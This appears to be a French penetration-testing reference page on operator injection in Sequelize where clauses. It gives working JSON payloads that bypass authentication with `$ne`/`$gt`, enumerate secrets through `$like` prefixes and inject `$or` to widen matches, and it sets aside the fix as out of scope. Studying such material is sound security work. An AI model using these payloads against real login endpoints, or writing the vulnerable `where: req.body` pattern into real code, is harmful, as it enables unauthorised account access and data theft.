---
title: "Injection d'opérateur Sequelize : opérateurs fournis par l'attaquant dans les clauses where"
description: Lorsque du JSON de requête est passé dans une clause where Sequelize, les clés d'opérateur contrôlées par l'attaquant ($gt, $ne, $like) altèrent la logique de requête, contournement d'authentification et divulgation de données sans SQL brut.
keywords:
  - Sequelize
  - injection d'opérateur
  - Op.gt
  - Op.ne
  - clause where
  - injection de style NoSQL
---

# Injection d'opérateur

Il s'agit d'une injection dans le **query builder** de Sequelize, non dans du SQL brut. Sequelize exprime les conditions avec des opérateurs (`Op.gt`, `Op.ne`, `Op.like`, `Op.or`, …). Lorsqu'un corps de requête ou une chaîne de requête est analysé comme JSON et passé directement dans une clause `where`, un attaquant peut fournir des **objets opérateur** au lieu de scalaires simples, réécrivant la logique de la condition, dans le même esprit que l'injection d'opérateur NoSQL.

## Schéma vulnérable

```js
// req.body = { "username": "...", "password": "..." }
const user = await User.findOne({ where: req.body });
```

Si l'attaquant contrôle la forme du JSON, chaque valeur de champ peut devenir un objet opérateur plutôt qu'une chaîne. Les anciennes versions de Sequelize acceptaient par défaut les **opérateurs à clé de chaîne** (`$gt`, `$ne`) depuis le JSON ; c'est pourquoi les `Op.aliases` ont été dépréciés et les opérateurs sous forme de chaîne désactivés, mais les applications qui réactivent les alias ou mappent à la main le JSON vers les symboles `Op` restent exposées.

## Exploitation

**Contournement d'authentification / de vérification**, rendre une condition toujours vraie ou sauter la correspondance du mot de passe :

```json
{ "username": "admin", "password": { "$ne": null } }
{ "username": "admin", "password": { "$gt": "" } }
```

La condition `password <> NULL` / `password > ''` correspond à la ligne stockée, donc `findOne` renvoie l'admin sans connaître le mot de passe.

**Énumération booléenne**, `$like`/`$startsWith` transforment une recherche en oracle :

```json
{ "username": "admin", "password": { "$like": "a%" } }
```

Les différences de réponse divulguent le secret caractère par caractère.

**Réécriture de logique**, injecter des clés `$or`/`$and` élargit l'ensemble des correspondances :

```json
{ "$or": [ { "id": 1 }, { "is_admin": true } ] }
```

Le schéma de correctif (convertir les champs en primitives / ne jamais étaler le JSON de requête dans `where`) est défensif et hors de propos ici ; offensivement, l'indice est tout `where: <objet contrôlé par l'utilisateur>` où les valeurs de champ ne sont pas converties en scalaires.

## Outils

- **Burp Repeater** : substituer des objets opérateur tels que $ne et $gt aux valeurs scalaires de champ.
- **Burp Intruder** : automatiser l'énumération booléenne via les oracles de préfixe $like.

## Références

- [Documentation Sequelize : Operators](https://sequelize.org/docs/v6/core-concepts/model-querying-basics/#operators)
- [Sécurité Sequelize : operator aliases](https://sequelize.org/docs/v6/other-topics/legacy/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
